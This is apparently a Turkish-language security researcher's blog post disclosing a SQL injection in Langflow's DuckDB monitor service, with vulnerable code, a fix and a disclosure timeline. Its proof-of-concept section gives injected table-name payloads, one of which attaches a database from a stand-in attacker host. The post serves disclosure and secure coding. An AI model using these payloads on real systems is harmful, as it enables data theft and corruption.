---
layout: post
title: "Langflow Monitor Service'inde SQL Injection: Tek DuckDB Bağlantısı, Dört Tane f-string"
date: 2026-06-14
author: Yunus Aydın
lang: tr
description: "Langflow'un monitor service'i DuckDB sorgularını user-controllable table_name üzerine f-string ile kuruyordu. Ben GitHub issue #1629 ile raporladım; maintainer kabul etti ama experimental kodu yayında bıraktı."
keywords: "Langflow, SQL injection, DuckDB, f-string, monitor service, güvenlik zafiyeti, security research, bug bounty"
canonical_url: "https://aydinnyunus.github.io/2026/06/14/langflow-sql-injection-monitor-service-tr/"
---

Ben 5 Nisan 2024'te Langflow'un monitor service'inde bir SQL injection buldum ve [GitHub issue #1629](https://github.com/langflow-ai/langflow/issues/1629) olarak raporladım. Tek bir dosyada (`src/backend/base/langflow/services/monitor/utils.py`) dört ayrı yerde DuckDB sorguları Python f-string ile kuruluyordu. Identifier'lar için ne escape, ne allowlist, ne parameterization. Sıfır kontrol.

Bunu Langflow'un repo'sunda dolaşırken, çalışma metadata'sını nasıl persist ettiğini incelerken buldum. Proje LLM-flow builder olarak hız kazanıyordu ve monitoring katmanının nasıl bağlandığını merak ettim. İlk `grep -n "execute(f\"" src/` çıkışı `monitor/utils.py`'a düştü ve arka arkaya dört adet f-string SQL gördüm. Bir kere okuyup yanlışı anladığın dosyalardan.

## Savunmasız kod

v1.0 alpha'da dört çağrı şu şekildeydi:

```python
# Line 17: schema introspection
def get_table_schema_as_dict(conn, table_name: str) -> dict:
    result = conn.execute(f"PRAGMA table_info('{table_name}')").fetchall()

# Line 63: DROP
conn.execute(f"DROP TABLE IF EXISTS {table_name}")

# Line 67: sequence creation
conn.execute(f"CREATE SEQUENCE seq_{table_name} START 1;")

# Line 97: INSERT
insert_sql = f"INSERT INTO {table_name} ({columns}) VALUES ({values_placeholders})"
conn.execute(insert_sql, values)
```

Line 97'deki placeholder'lar (`?`) doğru şekilde parameterize edilmiş, oraya itiraz yok. Ama statement'ın yapısı parameterize değil. `table_name` ve `columns` direkt Python dict'inden geliyor ve düz metin olarak interpolate ediliyor.

## Root cause

`table_name` üzerinde hiçbir kontrol yok. Hiç.

1. İzin verilen table identifier'ları için allowlist yok.
2. DuckDB identifier quoting yok (`quote_identifier` çağrısı yok, double-quote sarması yok).
3. Tip disiplini yok: imza `str` diyor ama içeride ne olduğunu kimse kontrol etmiyor.
4. Aynı korumasız `table_name` `PRAGMA`, `DROP`, `CREATE SEQUENCE` ve `INSERT` üzerinde tekrar kullanılıyor. Yani tek bir tainted path tablonun tüm yaşam döngüsünü zehirliyor.

`table_name`'i etkileyebilirsen (ve Monitor Service kullanıcı tanımlı flow'lardan şekillenen execution data'sı alıyor), identifier slot'undan çıkıp arbitrary DuckDB SQL çalıştırabilirsin.

## Proof of concept

Tetikleyici konsept olarak şöyle. `DROP TABLE IF EXISTS` path'i için zararlı bir `table_name`:

```text
messages; ATTACH 'http://attacker/x.duckdb' AS evil; --
```

Interpolation'dan sonra:

```sql
DROP TABLE IF EXISTS messages; ATTACH 'http://attacker/x.duckdb' AS evil; --
```

DuckDB tek bağlantı üzerinde multi-statement input'u sevinerek çalıştırır. ATTACH ile birlikte `httpfs` gibi DuckDB extension'larıyla dosya çekebilir veya yollayabilirsin; `COPY` ile process'in erişebildiği disk path'lerine yazıp okuyabilirsin. PRAGMA path'i de aynı şekilde kırık:

```text
'); SELECT * FROM duckdb_settings(); --
```

şuna dönüşüyor:

```sql
PRAGMA table_info(''); SELECT * FROM duckdb_settings(); --
```

Erişimin nereye kadar gittiği host environment'ta hangi DuckDB extension'larının yüklü olduğuna bağlı. Ama bir DuckDB bağlantısında arbitrary statement injection'a sahipsen, artık "sadece SQLi" konuşmuyorsun.

## Etki

- Monitor DuckDB store'una karşı arbitrary statement çalıştırma.
- Monitoring verisinin sızdırılması (LLM prompt'ları, run input'ları, run output'ları).
- DuckDB extension'ları yüklendiğinde, Langflow process'inin working directory'sinde dosya okuma/yazma.
- Schema bozulması: `DROP TABLE` ve `CREATE SEQUENCE` ulaşılabilir identifier slot'ları, yani attacker monitor'ü offline atabilir veya bozuk state ekebilir.

## Düzeltme

Minimum doğru düzeltme: bir identifier'ı asla SQL'e f-string ile sokma. Ya table name'leri allowlist'le (Monitor Service zaten yalnızca üç tane internal tablo yönetiyor: `messages`, `transactions`, `vertex_builds`), ya da quote-escape uygula. DuckDB için doğru kalıp:

```python
ALLOWED_TABLES = {"messages", "transactions", "vertex_builds"}

def _quote_ident(name: str) -> str:
    if name not in ALLOWED_TABLES:
        raise ValueError(f"unexpected table: {name!r}")
    return '"' + name.replace('"', '""') + '"'

conn.execute(f"DROP TABLE IF EXISTS {_quote_ident(table_name)}")
```

Maintainer ([@ogabrielluiz](https://github.com/ogabrielluiz)) raporu kabul etti ama farklı bir fix path'i seçti: Monitor Service experimental ve uzun vadeli plan SQLModel'e geçmek (zaten parameterization'ı doğru yapan bir kütüphane). Issue 10 Nisan 2024'te kod değişikliği olmadan kapatıldı.

## Bu pattern neden tekrar tekrar çıkıyor

DuckDB ve SQLite ikisi de identifier'ı sorguya itelemekten rahatsız olmazlar, ve Python binding'leri value'ları parameterize eder ama identifier'ı etmez. Bu yüzden developer açıkça `conn.execute("SELECT ?", [name])` yazıyor obvious case için, sonra dinamik tablo adı gerektiğinde refleksle f-string'e uzanıyor. `?` zaten aynı çağrıda. Zihin modeli "parameter'lar bunu benim için hallediyor", ki schema'yı değiştirmediğin sürece doğru.

Monitor Service ayrıca "experimental kod yayında kalıyor" pattern'inin ders kitabı örneği. Bir modüle README'de experimental demek tamam; bu güvenlik sınırı değil. Eğer kod install'da bundle'lanmışsa, flow data'sına maruzsa ve diske yazıyorsa, attack surface'i geri kalan uygulamayla aynı. Maintainer'ın "kabul ediyorum ama erteliyorum" cevabı dürüst, ve direkt söylediği için saygı duyuyorum. Ama pratik etkisi şu: bu rapor ile eventual SQLModel migration'ı arasında Langflow'u production'da çalıştıran kullanıcılar bug'ı yanlarında taşıdılar.

## Raporlama zaman çizelgesi

- **5 Nisan 2024**: [GitHub issue #1629](https://github.com/langflow-ai/langflow/issues/1629)'u dosya referansları ve remediation rehberi ile açtım.
- **9 Nisan 2024**: Maintainer [@ogabrielluiz](https://github.com/ogabrielluiz) yanıt verdi, kabul etti, Monitor Service'in experimental olduğunu belirtti ve SQLModel migration'ına işaret etti.
- **10 Nisan 2024**: Issue kapatıldı.
- **CVE atanmadı.**

## Referanslar

- [GitHub Issue: Langflow #1629](https://github.com/langflow-ai/langflow/issues/1629)
- [Savunmasız dosya (güncel dev branch)](https://github.com/langflow-ai/langflow/blob/dev/src/backend/base/langflow/services/monitor/utils.py)
- [CWE-89: SQL komutunda özel karakterlerin uygunsuz nötralizasyonu](https://cwe.mitre.org/data/definitions/89.html)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [DuckDB SQL Identifiers dokümantasyonu](https://duckdb.org/docs/sql/dialect/keywords_and_identifiers)

## İlgili içerik

- [GeoPandas to_postgis()'te SQL Injection](https://aydinnyunus.github.io/2025/12/27/sql-injection-geopandas-tr/)
- [NLTK Collocations'ta Command Injection](https://aydinnyunus.github.io/2026/06/07/command-injection-nltk-collocations-eval-tr/)
